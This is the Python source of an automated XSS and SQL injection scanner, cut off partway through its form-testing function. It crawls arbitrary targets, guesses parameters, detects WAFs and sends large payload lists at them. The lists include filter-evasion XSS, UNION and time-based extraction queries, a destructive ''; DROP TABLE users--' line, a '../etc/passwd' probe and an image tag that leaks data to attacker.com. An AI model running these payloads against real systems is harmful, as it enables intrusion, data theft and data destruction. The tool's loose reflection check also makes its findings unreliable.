#!/usr/bin/env python3
"""
AutoWeb - Advanced XSS & SQLi Scanner (v2.3 - Payload Output Format)
For authorized security testing only.
"""

import requests
import re
import urllib.parse
import base64
import hashlib
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Set, List, Tuple, Optional, Dict
import argparse
import sys
import time
from requests.exceptions import RequestException, Timeout, ConnectionError
import logging
import json
from collections import defaultdict
from datetime import datetime
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────────────────
# XSS PAYLOADS - Comprehensive Set
# ────────────────────────────────────────

XSS_PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "<script>alert('xss')</script>",
    "<script>confirm(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<img src=x onerror=alert(1)>",
    "<img src='x' onerror=alert(1)>",
    "<img src=x onerror=prompt(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",
    "\" onclick=alert(1) x=\"",
    "' onclick=alert(1) x='",
    "javascript:alert(1)",
    "\"javascript:alert(1)\"",
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
]

XSS_PAYLOADS_ADVANCED = [
    "\"';--><img src=x onerror=alert(1)>",
    "\" autofocus onfocus=\"alert(1)",
    "{{constructor.constructor('alert(1)')()}}",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>eval('al'+'ert(1)')</script>",
    "<script>\\u0061lert(1)</script>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<svg><script>alert&#x28;1&#x29;</script></svg>",
    "<scr\\tipt>alert(1)</sc\\rippt>",
    "<scr<!-->ipt>alert(1)</scr<!-->ipt>",
    "<script>/**/alert(1)/**/</script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>Function('alert(1)')()</script>",
    "<script>setTimeout('alert(1)')</script>",
    "<script>new Function`alert\\1401\\140```</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<svg><animatetransform onbegin=alert(1)>",
    "<svg><animate onbegin=alert(1)>",
    "<style>body{background-image:url(javascript:alert(1))}</style>",
    "<img src=\"http://attacker.com/leak?data=",
    "{{1+1}}",
    "${alert(1)}",
    "<script type=module>alert(1)</script>",
]

ALL_XSS_PAYLOADS = XSS_PAYLOADS_BASIC + XSS_PAYLOADS_ADVANCED

# ────────────────────────────────────────
# SQLi PAYLOADS - Comprehensive Set
# ────────────────────────────────────────

SQLI_PAYLOADS_BASIC = [
    "'",
    "\"",
    "' --",
    "' #",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "OR 1=1",
    "OR 1=1 --",
    "' OR 1=1 --",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "admin' --",
    "admin' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "' UNION SELECT 1 --",
    "1 OR 1=1",
    "1 AND 1=1",
    "1 AND 1=2",
    "'--",
    "'#",
    "')--",
    "') OR ('1'='1",
]

SQLI_PAYLOADS_ADVANCED = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
    "' AND CAST((SELECT version()) AS INTEGER)--",
    "' AND 1=CONVERT(INT, (SELECT @@version))--",
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT @@version,2,3--",
    "' UNION SELECT database(),2,3--",
    "' UNION SELECT user(),2,3--",
    "' UNION SELECT table_name,2,3 FROM information_schema.tables--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR 1=2--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' OR SLEEP(3)--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(3)--",
    "' OR BENCHMARK(5000000,MD5('test'))--",
    "' OR (SELECT pg_sleep(3))--",
    "' AND (SELECT pg_sleep(3))--",
    "' WAITFOR DELAY '0:0:3'--",
    "' WAITFOR DELAY '0:0:5'--",
    "1'; WAITFOR DELAY '0:0:3'--",
    "' OR DBMS_LOCK.SLEEP(3)--",
    "'; DROP TABLE users--",
    "%27%20OR%20%271%27%3D%271",
    "'/**/OR/**/'1'='1",
    "'||'1'='1",
    "' OR 1 LIKE 1--",
    "' OR 1 IN (1)--",
    "' OR 1 BETWEEN 0 AND 2--",
    "' OR 1=0x1--",
    "' OR 1=CHAR(49)--",
    "' OR 1=CHR(49)--",
    "' oR '1'='1",
    "' UNIoN SELECT 1,2,3 --",
    "' sLeEp(3) --",
    "' || '1'=='1",
]

ALL_SQLI_PAYLOADS = SQLI_PAYLOADS_BASIC + SQLI_PAYLOADS_ADVANCED

# ────────────────────────────────────────
# SQL injection error / indicator patterns
# ────────────────────────────────────────

SQLI_ERROR_INDICATORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_error",
    "pg_query",
    "pg_last_error",
    "sqlite",
    "sql error",
    "sql syntax",
    "unclosed quotation mark",
    "incorrect syntax",
    "odbc driver",
    "sql server",
    "microsoft ole db",
    "ora-[0-9]{4,6}",
    "ora-[0-9]",
    "quoted string not properly terminated",
    "unexpected end of sql command",
    "syntax error",
    "division by zero",
    "column count doesn't match",
    "unknown column",
    "unknown table",
    "table doesn't exist",
    "microsoft ole db",
    "conversion failed",
    "unclosed quotation",
    "jdbc",
    "com.mysql",
    "org.postgresql",
]

# ────────────────────────────────────────
# WAF Detection
# ────────────────────────────────────────

WAF_DETECTION_PAYLOADS = [
    "1' OR '1'='1",
    "<script>alert(1)</script>",
    "' UNION SELECT * FROM information_schema.tables--",
    "../etc/passwd",
    "'; DROP TABLE users--",
    "<img src=x onerror=alert(1)>",
]

WAF_SIGNATURES = {
    'Cloudflare': ['cloudflare-nginx', '__cfduid', 'cf-ray', 'cf-request-id'],
    'ModSecurity': ['mod_security', 'modsecurity', 'No Vary Cookie'],
    'AWS WAF': ['x-amzn-RequestId', 'x-amzn-ErrorType', 'AWSALB'],
    'F5 BIG-IP': ['BigIP', 'F5', 'TS01'],
    'Akamai': ['akamai', 'akamaized', 'AkamaiGHost'],
    'Imperva / Incapsula': ['incapsula', 'X-Iinfo', 'visid_incap'],
    'Sucuri / CloudProxy': ['sucuri', 'cloudproxy', 'Sucuri/Cloudproxy'],
    'Barracuda': ['barracuda', 'BarracudaNetworks'],
    'Wordfence': ['wordfence', 'WFWAF'],
    'Fortinet': ['fortiwaf', 'FortiWeb'],
    'Radware': ['radware', 'AppWall'],
    'Comodo': ['comodo', 'Comodo_WAF'],
    'Citrix': ['netscaler', 'Citrix'],
    'Varnish': ['varnish', 'X-Varnish'],
}

# ────────────────────────────────────────
# Auto-Detection: Common paths, parameters, and extensions
# ────────────────────────────────────────

COMMON_PATHS = [
    '', 'index.php', 'index.html', 'index.asp', 'index.aspx', 'index.jsp',
    'home', 'main', 'default', 'portal', 'web', 'app', 'application',
    'api', 'api/v1', 'api/v2', 'api/v3', 'api/v4',
    'admin', 'administrator', 'login', 'signin', 'auth', 'authenticate',
    'register', 'signup', 'account', 'profile', 'user', 'users',
    'search', 'query', 'results', 'find', 'lookup',
    'product', 'products', 'item', 'items', 'category', 'categories',
    'news', 'blog', 'post', 'posts', 'article', 'articles',
    'about', 'contact', 'support', 'help', 'faq',
    'download', 'uploads', 'files', 'media', 'images',
    'test', 'dev', 'staging', 'demo', 'sandbox',
]

COMMON_PARAMETERS = [
    'id', 'page', 'cat', 'category', 'product', 'item', 'user', 'userid',
    'name', 'username', 'email', 'q', 'query', 's', 'search', 'keyword',
    'action', 'method', 'mode', 'type', 'format', 'view', 'sort', 'order',
    'lang', 'language', 'locale', 'region', 'country',
    'debug', 'test', 'dev', 'mode', 'profile',
    'data', 'input', 'param', 'value', 'redirect', 'return',
    'file', 'path', 'dir', 'folder', 'filename', 'ext',
    'start', 'limit', 'offset', 'page_size', 'per_page',
    'token', 'key', 'api_key', 'apikey', 'secret', 'auth',
]

COMMON_EXTENSIONS = [
    '.php', '.asp', '.aspx', '.jsp', '.do', '.action',
    '.html', '.htm', '.shtml', '.xhtml',
    '.json', '.xml', '.rss', '.atom',
    '.js', '.css', '.less', '.scss',
    '.txt', '.csv', '.tsv', '.log',
    '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
]

TECHNOLOGY_SIGNATURES = {
    'PHP': ['php', '.php', 'PHPSESSID'],
    'ASP.NET': ['asp.net', 'ASP.NET', '__VIEWSTATE', '__EVENTVALIDATION'],
    'JSP': ['jsp', '.jsp', 'JSESSIONID'],
    'Ruby on Rails': ['rails', 'ruby', '_session_id'],
    'Django': ['django', 'csrftoken', 'sessionid'],
    'Flask': ['flask', 'session', '_flashes'],
    'Node.js': ['node', 'express', 'connect.sid'],
    'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
    'Drupal': ['drupal', 'sites/default'],
    'Joomla': ['joomla', 'Joomla!'],
    'Magento': ['magento', 'Mage_Cookies'],
    'Shopify': ['shopify', 'myshopify.com'],
    'Wix': ['wix', 'wix.com'],
    'Angular': ['ng-', '_ng', 'angular'],
    'React': ['react', '_react', 'data-react'],
    'Vue.js': ['vue', 'vue.js', 'v-'],
}

class ColorPrint:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

    @staticmethod
    def success(text):
        print(f"{ColorPrint.GREEN}{text}{ColorPrint.END}")

    @staticmethod
    def error(text):
        print(f"{ColorPrint.RED}{text}{ColorPrint.END}")

    @staticmethod
    def warning(text):
        print(f"{ColorPrint.YELLOW}{text}{ColorPrint.END}")

    @staticmethod
    def info(text):
        print(f"{ColorPrint.CYAN}{text}{ColorPrint.END}")

    @staticmethod
    def bold(text):
        print(f"{ColorPrint.BOLD}{text}{ColorPrint.END}")

    @staticmethod
    def payload_output(vuln_type, url, payload, parameter=None):
        """Print vulnerability in the format: target.com<payload>"""
        # Extract base URL (remove parameters)
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # If there are parameters, include them in the output
        if parameter:
            # Create a clean URL with the vulnerable parameter and payload
            params = parse_qs(parsed.query, keep_blank_values=True)
            params[parameter] = [payload]
            new_query = urllib.parse.urlencode(params, doseq=True)
            full_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            # Clean version for display
            clean_url = base_url
            if parsed.query:
                clean_url = f"{base_url}?{parsed.query}"
            
            # Output in the requested format: target.com<payload>
            if vuln_type.startswith('XSS'):
                print(f"{ColorPrint.RED}▶ {clean_url}{ColorPrint.END}{ColorPrint.GREEN}<{payload}>{ColorPrint.END}")
            else:
                print(f"{ColorPrint.RED}▶ {clean_url}{ColorPrint.END}{ColorPrint.YELLOW}<{payload}>{ColorPrint.END}")
        else:
            # Simple output without parameter
            print(f"{ColorPrint.RED}▶ {base_url}{ColorPrint.END}{ColorPrint.GREEN}<{payload}>{ColorPrint.END}")

class AutoWebScanner:
    def __init__(self, target_url: str, threads: int = 5, timeout: int = 10,
                 cookies: Optional[Dict] = None, headers: Optional[Dict] = None,
                 crawl_depth: int = 2, delay: float = 0, xss_advanced: bool = True,
                 sqli_advanced: bool = True, auto_detect: bool = True,
                 output_file: Optional[str] = None, verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.visited: Set[str] = set()
        self.forms: List[Dict] = []
        self.xss_vulns: List[Dict] = []
        self.sqli_vulns: List[Dict] = []
        self.threads = threads
        self.timeout = timeout
        self.crawl_depth = crawl_depth
        self.delay = delay
        self.xss_advanced = xss_advanced
        self.sqli_advanced = sqli_advanced
        self.auto_detect = auto_detect
        self.output_file = output_file
        self.verbose = verbose
        self.waf_detected = False
        self.waf_name = "None"
        self.technologies = set()
        self.all_parameters = set()
        self.discovered_urls = set()
        
        self.session = requests.Session()
        self.session.headers.update(headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        if cookies:
            self.session.cookies.update(cookies)
        self.domain = urlparse(target_url).netloc
        self.request_count = 0
        self.max_requests = 10000
        self.start_time = datetime.now()
        
        # For output file
        if self.output_file:
            self.output_handle = open(self.output_file, 'w')
            self.output_handle.write(f"# AutoWeb Scan Results - {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            self.output_handle.write(f"# Target: {self.target_url}\n\n")

    def get_xss_payloads(self) -> List[str]:
        return XSS_PAYLOADS_BASIC + (XSS_PAYLOADS_ADVANCED if self.xss_advanced else [])

    def get_sqli_payloads(self) -> List[str]:
        return SQLI_PAYLOADS_BASIC + (SQLI_PAYLOADS_ADVANCED if self.sqli_advanced else [])

    def safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Make a safe request with error handling and rate limiting."""
        if self.request_count >= self.max_requests:
            return None
        
        try:
            if self.delay:
                time.sleep(self.delay)
            
            self.request_count += 1
            kwargs.setdefault('timeout', self.timeout)
            kwargs.setdefault('verify', False)
            kwargs.setdefault('allow_redirects', True)
            
            if method.lower() == 'get':
                return self.session.get(url, **kwargs)
            elif method.lower() == 'post':
                return self.session.post(url, **kwargs)
            elif method.lower() == 'head':
                return self.session.head(url, **kwargs)
            else:
                return None
        except (Timeout, ConnectionError) as e:
            return None
        except Exception as e:
            return None

    def log_to_file(self, text: str):
        """Write output to file if specified"""
        if self.output_file:
            self.output_handle.write(text + '\n')
            self.output_handle.flush()

    # ────────────────────────────────────────
    # Auto-Detection Methods
    # ────────────────────────────────────────

    def detect_technologies(self, html: str, headers: Dict) -> None:
        """Detect technologies used by the target."""
        content = html.lower() if html else ""
        header_str = str(headers).lower()
        
        for tech, signatures in TECHNOLOGY_SIGNATURES.items():
            for sig in signatures:
                if sig.lower() in content or sig.lower() in header_str:
                    self.technologies.add(tech)
                    break

    def discover_common_paths(self) -> Set[str]:
        """Discover common paths on the target."""
        discovered = set()
        
        if self.verbose:
            print("[*] Discovering common paths...")
        
        for path in COMMON_PATHS:
            test_url = f"{self.target_url}/{path}"
            r = self.safe_request('head', test_url)
            if r and r.status_code < 400:
                discovered.add(test_url)
                self.discovered_urls.add(test_url)
                if self.verbose:
                    print(f"  [Discovered] {test_url} (status: {r.status_code})")
        
        for ext in COMMON_EXTENSIONS:
            test_url = f"{self.target_url}{ext}"
            r = self.safe_request('head', test_url)
            if r and r.status_code < 400:
                discovered.add(test_url)
                self.discovered_urls.add(test_url)
                if self.verbose:
                    print(f"  [Discovered] {test_url} (status: {r.status_code})")
        
        return discovered

    def get_common_parameters(self) -> Set[str]:
        """Get common parameters based on detected technologies."""
        params = set(COMMON_PARAMETERS)
        
        for tech in self.technologies:
            if 'PHP' in tech:
                params.update(['PHPSESSID', 'lang'])
            elif 'ASP.NET' in tech:
                params.update(['__VIEWSTATE', '__EVENTVALIDATION'])
            elif 'Django' in tech:
                params.update(['csrftoken', 'sessionid'])
            elif 'WordPress' in tech:
                params.update(['wp', 'p', 'page_id', 'cat', 'tag'])
            elif 'Magento' in tech:
                params.update(['utm_source', 'utm_medium', 'utm_campaign'])
        
        return params

    def test_for_tech_identified_pages(self) -> List[str]:
        """Test for technology-specific pages and files."""
        tech_pages = []
        
        if 'WordPress' in self.technologies:
            wp_paths = [
                '/wp-admin', '/wp-login.php', '/wp-content', '/wp-includes',
                '/xmlrpc.php', '/wp-json', '/wp-json/wp/v2/posts'
            ]
            for path in wp_paths:
                test_url = f"{self.target_url}{path}"
                r = self.safe_request('head', test_url)
                if r and r.status_code < 400:
                    tech_pages.append(test_url)
                    self.discovered_urls.add(test_url)
                    if self.verbose:
                        print(f"  [Discovered WP] {test_url}")
        
        if 'Django' in self.technologies:
            django_paths = ['/admin', '/static', '/media']
            for path in django_paths:
                test_url = f"{self.target_url}{path}"
                r = self.safe_request('head', test_url)
                if r and r.status_code < 400:
                    tech_pages.append(test_url)
                    self.discovered_urls.add(test_url)
        
        if 'ASP.NET' in self.technologies:
            asp_paths = ['/login.aspx', '/default.aspx', '/web.config']
            for path in asp_paths:
                test_url = f"{self.target_url}{path}"
                r = self.safe_request('head', test_url)
                if r and r.status_code < 400:
                    tech_pages.append(test_url)
                    self.discovered_urls.add(test_url)
        
        return tech_pages

    def discover_dynamic_parameters(self) -> Dict[str, List[str]]:
        """Discover potential parameters from forms and JavaScript."""
        if self.verbose:
            print("[*] Discovering dynamic parameters...")
        
        discovered_params = {}
        
        for url in list(self.discovered_urls)[:20]:
            r = self.safe_request('get', url)
            if r and r.status_code == 200:
                forms = self.extract_forms(r.text, url)
                for form in forms:
                    for inp in form['inputs']:
                        if inp['name'] not in discovered_params:
                            discovered_params[inp['name']] = [url]
                        elif url not in discovered_params[inp['name']]:
                            discovered_params[inp['name']].append(url)
                
                js_patterns = re.findall(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=', r.text)
                for param in js_patterns:
                    if param not in discovered_params:
                        discovered_params[param] = [url]
                    elif url not in discovered_params[param]:
                        discovered_params[param].append(url)
        
        for param in discovered_params:
            self.all_parameters.add(param)
        
        return discovered_params

    # ────────────────────────────────────────
    # WAF Detection
    # ────────────────────────────────────────

    def detect_waf(self) -> str:
        ColorPrint.info("[*] Checking for WAF/IPS...")
        for payload in WAF_DETECTION_PAYLOADS:
            try:
                params = {'test': payload}
                r = self.safe_request('get', self.target_url, params=params)
                if r:
                    for waf_name, sigs in WAF_SIGNATURES.items():
                        for sig in sigs:
                            if sig.lower() in str(r.headers).lower():
                                self.waf_detected = True
                                self.waf_name = waf_name
                                result = f"[!] WAF Detected: {waf_name} (via header signature: {sig})"
                                ColorPrint.warning(result)
                                return result
            except Exception:
                continue

        try:
            clean_r = self.safe_request('get', self.target_url)
            if clean_r:
                for payload in WAF_DETECTION_PAYLOADS[:3]:
                    dirty_r = self.safe_request(
                        'get', self.target_url,
                        params={'q': payload}
                    )
                    if dirty_r and dirty_r.status_code in [403, 406, 429, 503] and clean_r.status_code == 200:
                        self.waf_detected = True
                        self.waf_name = "Status-based"
                        result = f"[!] WAF/IPS Detected: {self.waf_name}"
                        ColorPrint.warning(result)
                        return result
        except Exception:
            pass

        result = "[*] No WAF detected or unable to determine."
        ColorPrint.info(result)
        return result

    # ────────────────────────────────────────
    # Crawling
    # ────────────────────────────────────────

    def extract_links(self, html: str, base_url: str) -> Set[str]:
        links = set()
        try:
            soup = BeautifulSoup(html, 'html.parser')

            for tag in soup.find_all(['a', 'link', 'area']):
                href = tag.get('href')
                if href:
                    full_url = urljoin(base_url, href)
                    parsed = urlparse(full_url)
                    if parsed.netloc == self.domain and parsed.scheme.startswith('http'):
                        clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                        links.add(clean.rstrip('/'))

            for form in soup.find_all('form'):
                action = form.get('action')
                if action:
                    full_url = urljoin(base_url, action)
                    parsed = urlparse(full_url)
                    if parsed.netloc == self.domain:
                        links.add(f"{parsed.scheme}://{parsed.netloc}{parsed.path}".rstrip('/'))
        except Exception:
            pass
        return links

    def extract_forms(self, html: str, base_url: str) -> List[Dict]:
        forms = []
        try:
            soup = BeautifulSoup(html, 'html.parser')

            for form in soup.find_all('form'):
                action = form.get('action')
                method = form.get('method', 'get').lower()
                form_url = urljoin(base_url, action) if action else base_url

                inputs = []
                for inp in form.find_all(['input', 'textarea', 'select']):
                    input_name = inp.get('name')
                    input_type = inp.get('type', 'text').lower()
                    if input_name:
                        default_value = inp.get('value', '')
                        if input_type == 'hidden' and not default_value:
                            default_value = '1'
                        inputs.append({
                            'name': input_name,
                            'type': input_type,
                            'value': default_value,
                        })

                if not inputs:
                    continue

                forms.append({
                    'url': form_url,
                    'method': method,
                    'inputs': inputs,
                })
        except Exception:
            pass
        return forms

    def extract_url_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        return list(params.keys())

    def crawl(self, url: str, depth: int = 0):
        if depth > self.crawl_depth or url in self.visited:
            return
        self.visited.add(url)

        try:
            r = self.safe_request('get', url)
            if not r or r.status_code != 200:
                return

            html = r.text
            
            self.detect_technologies(html, r.headers)

            page_forms = self.extract_forms(html, url)
            if page_forms:
                if self.verbose:
                    print(f"  [Forms] Found {len(page_forms)} form(s) on {url}")
                self.forms.extend(page_forms)

            params = self.extract_url_params(url)
            if params:
                if self.verbose:
                    print(f"  [Params] Found {len(params)} parameter(s) on {url}: {params}")
                self.all_parameters.update(params)

            if depth < self.crawl_depth:
                links = self.extract_links(html, url)
                for link in links:
                    if link not in self.visited:
                        self.crawl(link, depth + 1)

        except Exception as e:
            if self.verbose:
                print(f"  [!] Crawl error on {url}: {str(e)[:80]}")

    # ────────────────────────────────────────
    # XSS Testing
    # ────────────────────────────────────────

    def is_payload_reflected(self, payload: str, response_text: str) -> bool:
        if not response_text:
            return False
        
        if payload in response_text:
            return True
        
        if urllib.parse.quote(payload, safe='') in response_text:
            return True
        if urllib.parse.quote(payload) in response_text:
            return True
        
        if payload.replace('<', '&lt;').replace('>', '&gt;') in response_text:
            return True
        if payload.replace('"', '&quot;') in response_text:
            return True
        if payload.replace("'", '&#39;') in response_text:
            return True
        
        double = urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
        if double in response_text:
            return True
        
        unique_fragments = [
            'onerror=', 'onload=', 'onfocus=', 'onmouseover=',
            'javascript:', 'src=x', 'svg', 'autofocus',
            'alert(', 'confirm(', 'prompt('
        ]
        for frag in unique_fragments:
            if frag in payload and frag.lower() in response_text.lower():
                return True
        
        return False

    def test_xss_reflected(self, url: str, param: str) -> Optional[Dict]:
        for payload in self.get_xss_payloads():
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]

                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                r = self.safe_request('get', test_url)
                if r and self.is_payload_reflected(payload, r.text):
                    return {
                        'type': 'XSS (Reflected)',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:200],
                        'full_url': test_url
                    }

            except Exception:
                continue
        return None

    def test_xss_form(self, form: Dict) -> List[Dict]:
        findings = []
        url = form['url']
        method = form['method']

        for inp in form['inputs']:
            if inp['type'] in ['submit', 'button', 'reset', 'image']:
                continue

            for payload in self.get_xss_payloads():
                try:
                    form_data = {}
                    for other_inp in form['inputs']:
                        if other_inp['name'] == inp['name']:
                            form_data[other_inp['name']] = payload
                        elif other_inp['type'] in ['submit', 'button', 'reset']:
                            continue
                        else:
                            form_data[other_inp['name']] = other_inp.get('value', 'test')

                    if method == 'post':
                        r = self.safe_request('post', url, data=form_data)
                    else:
                        r = self.safe_request('get', url, params=form_data)

                    if r and self.is_payload_reflected(payload, r.text):
                        findings.append({
                            'type': 'XSS (Form)',
                            'url': url,
                            'parameter': inp['name'],
                            'payload': payload[:200],
                            'method': method.upper(),
                            'full_url': url
                        })
                        break

                except Exception:
                    continue
        return findings

    def test_xss_common_parameters(self) -> List[Dict]:
        findings = []
        if self.verbose:
            print("[*] Testing discovered/common parameters for XSS...")
        
        test_urls = list(self.discovered_urls) + [self.target_url]
        test_urls = test_urls[:10]
        
        common_params = self.get_common_parameters()
        
        for url in test_urls:
            for param in common_params:
                result = self.test_xss_reflected(url, param)
                if result:
                    findings.append(result)
                    ColorPrint.payload_output('XSS', url, result['payload'], param)
                    self.log_to_file(f"{url}<{result['payload']}>")
        
        return findings

    def scan_xss(self):
        ColorPrint.bold("\n[===== XSS SCAN =====]")
        all_findings = []
        payloads_count = len(self.get_xss_payloads())

        # 1) Test URL parameters from crawled pages
        param_tasks = []
        for url in list(self.visited):
            params = self.extract_url_params(url)
            for param in params:
                param_tasks.append((url, param))

        # 2) Add discovered parameters
        if self.auto_detect:
            for param in self.all_parameters:
                if param not in [p for _, p in param_tasks]:
                    for url in list(self.discovered_urls)[:5]:
                        param_tasks.append((url, param))

        # 3) Add common parameters
        common_params = self.get_common_parameters()
        for param in common_params:
            if param not in [p for _, p in param_tasks]:
                for url in list(self.discovered_urls)[:3] + [self.target_url]:
                    param_tasks.append((url, param))

        if param_tasks:
            total = len(param_tasks)
            ColorPrint.info(f"[*] Testing {total} URL parameter(s) with {payloads_count} XSS payloads each...")
            with ThreadPoolExecutor(max_workers=min(self.threads, len(param_tasks))) as executor:
                futures = {
                    executor.submit(self.test_xss_reflected, url, param): (url, param)
                    for url, param in param_tasks
                }
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=self.timeout+5)
                        if result:
                            all_findings.append(result)
                            ColorPrint.payload_output('XSS', result['url'], result['payload'], result['parameter'])
                            self.log_to_file(f"{result['url']}<{result['payload']}>")
                    except Exception as e:
                        continue

        # 4) Test forms
        if self.forms:
            ColorPrint.info(f"[*] Testing {len(self.forms)} form(s) with {payloads_count} XSS payloads each...")
            with ThreadPoolExecutor(max_workers=min(self.threads, len(self.forms))) as executor:
                futures = {executor.submit(self.test_xss_form, form): form for form in self.forms}
                for future in as_completed(futures):
                    try:
                        results = future.result(timeout=self.timeout+5)
                        for result in results:
                            all_findings.append(result)
                            ColorPrint.payload_output('XSS', result['url'], result['payload'], result['parameter'])
                            self.log_to_file(f"{result['url']}<{result['payload']}>")
                    except Exception as e:
                        continue

        self.xss_vulns = all_findings
        if not all_findings:
            ColorPrint.info("[*] No XSS vulnerabilities found.")
        else:
            ColorPrint.success(f"[+] Found {len(all_findings)} XSS vulnerability(ies)")
        return all_findings

    # ────────────────────────────────────────
    # SQLi Testing
    # ────────────────────────────────────────

    def has_sqli_error(self, response_text: str) -> bool:
        if not response_text:
            return False
        for pattern in SQLI_ERROR_INDICATORS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def test_sqli_reflected(self, url: str, param: str) -> Optional[Dict]:
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            baseline_r = self.safe_request('get', url)
            if not baseline_r:
                return None
            baseline_length = len(baseline_r.text)
            baseline_status = baseline_r.status_code
        except Exception:
            return None

        for payload in self.get_sqli_payloads():
            try:
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urllib.parse.urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                start_time = time.time()
                r = self.safe_request('get', test_url)
                if not r:
                    continue
                elapsed = time.time() - start_time

                if self.has_sqli_error(r.text):
                    finding = {
                        'type': 'SQLi (Error-based)',
                        'url': test_url,
                        'parameter': param,
                        'payload': payload[:200],
                        'full_url': test_url
                    }
                    for pattern in SQLI_ERROR_INDICATORS:
                        match = re.search(pattern, r.text, re.IGNORECASE)
                        if match:
                            start = max(0, match.start() - 30)
                            end = min(len(r.text), match.end() + 30)
                            finding['detail'] = f"Error: ...{r.text[start:end]}..."
                            break
                    return finding

                if r.status_code != baseline_status:
                    if any(x in payload.lower() for x in ['or', 'and', 'union', 'sleep', 'waitfor']):
                        return {
                            'type': 'SQLi (Boolean-based - status)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload[:200],
                            'detail': f'Status {baseline_status} → {r.status_code}',
                            'full_url': test_url
                        }

                if baseline_length > 0:
                    content_diff = abs(len(r.text) - baseline_length)
                    if content_diff > baseline_length * 0.3:
                        if any(x in payload.lower() for x in ['or', 'and', 'union', 'order by']):
                            return {
                                'type': 'SQLi (Boolean-based - content)',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload[:200],
                                'detail': f'Size: {baseline_length} → {len(r.text)} (diff: {content_diff})',
                                'full_url': test_url
                            }

                if elapsed >= self.timeout * 0.8:
                    if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                        return {
                            'type': 'SQLi (Time-based)',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload[:200],
                            'detail': f'Response: {elapsed:.2f}s',
                            'full_url': test_url
                        }

            except Timeout:
                if any(x in payload.lower() for x in ['sleep', 'waitfor', 'benchmark', 'pg_sleep', 'dbms_lock']):
                    return {
                        'type': 'SQLi (Time-based - timeout)',
                        'url': url,
                        'parameter': param,
                        'payload': payload[:200],
                        'detail': 'Request timed out',
                        'full_url': url
                    }
            except Exception:
                continue

        return None

    def test_sqli_form(self, form: Dict) -> List[Dict]:
        findings = []
        url = form['url']
        method = form['method']

